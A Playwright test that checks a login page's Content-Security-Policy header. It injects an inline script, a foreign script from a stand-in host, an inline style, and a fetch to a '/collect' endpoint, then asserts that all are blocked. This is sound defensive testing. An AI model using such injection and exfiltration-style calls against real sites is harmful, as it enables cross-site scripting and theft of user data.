import { test, expect } from "@playwright/test";

test("proxy enforces CSP while the production login UI remains functional", async ({ page }) => {
  const response = await page.goto("/login");
  expect(response).not.toBeNull();
  const headers = response!.headers();
  expect(headers["content-security-policy"]).toContain("script-src 'self'");
  expect(headers["content-security-policy-report-only"]).toBeUndefined();
  expect(headers["content-security-policy"]).not.toMatch(/unsafe-inline|unsafe-eval/);
  await expect(page.getByRole("heading", { name: "Вход в ALXPRGS" })).toBeVisible();
  await expect(page.getByLabel("Имя пользователя или Email")).toBeEditable();
  let foreignRequests = 0;
  await page.route("https://csp-injected.example/**", route => { foreignRequests++; return route.abort(); });
  const result = await page.evaluate(async () => {
    const violations: string[] = [];
    document.addEventListener("securitypolicyviolation", event => violations.push(event.violatedDirective));
    const script = document.createElement("script");
    script.textContent = "document.documentElement.dataset.injected = 'executed'";
    document.body.append(script);
    const foreign = document.createElement("script");
    foreign.src = "https://csp-injected.example/script.js";
    document.body.append(foreign);
    const style = document.createElement("style");
    style.textContent = "html { --injected-style: executed; }";
    document.head.append(style);
    await fetch("https://csp-injected.example/collect").catch(() => undefined);
    await new Promise(resolve => setTimeout(resolve, 100));
    return { violations, executed: document.documentElement.dataset.injected,
      style: getComputedStyle(document.documentElement).getPropertyValue("--injected-style") };
  });
  expect(result.executed).toBeUndefined();
  expect(result.style).toBe("");
  expect(result.violations).toEqual(expect.arrayContaining(["script-src-elem", "style-src-elem", "connect-src"]));
  expect(foreignRequests).toBe(0);
  await expect(page.getByLabel("Пароль", { exact: true })).toBeEditable();
});
